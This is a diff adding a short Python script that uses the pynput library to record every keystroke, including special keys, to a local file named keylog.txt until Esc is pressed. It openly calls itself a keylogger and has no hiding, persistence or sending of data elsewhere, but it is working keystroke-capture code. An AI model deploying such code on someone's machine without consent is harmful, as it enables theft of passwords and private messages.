@@ -1,0 +1,47 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+# Define the log file
+log_file = "keylog.txt"
+
+def on_press(key):
+    """
+    This function is called every time a key is pressed.
+    It logs the key press to the specified file.
+    """
+    try:
+        # Open the log file in append mode
+        with open(log_file, "a") as f:
+            # Write the character pressed
+            f.write(f'{key.char}')
+    except AttributeError:
+        # Handle special keys (e.g., space, enter, shift)
+        with open(log_file, "a") as f:
+            key_name = str(key)
+            if key_name == "Key.space":
+                f.write(' ')
+            elif key_name == "Key.enter":
+                f.write('\n')
+            elif key_name == "Key.tab":
+                f.write('\t')
+            else:
+                # For other special keys like Ctrl, Shift, etc., log their names
+                f.write(f' [{key_name}] ')
+
+
+def on_release(key):
+    """
+    This function is called when a key is released.
+    It stops the listener if the Escape key is pressed.
+    """
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+# --- Main part of the script ---
+if __name__ == "__main__":
+    print("Starting keylogger... Press 'Esc' to stop.")
+    # Collect events until on_release returns False
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+    print("Keylogger stopped. Log saved to keylog.txt")
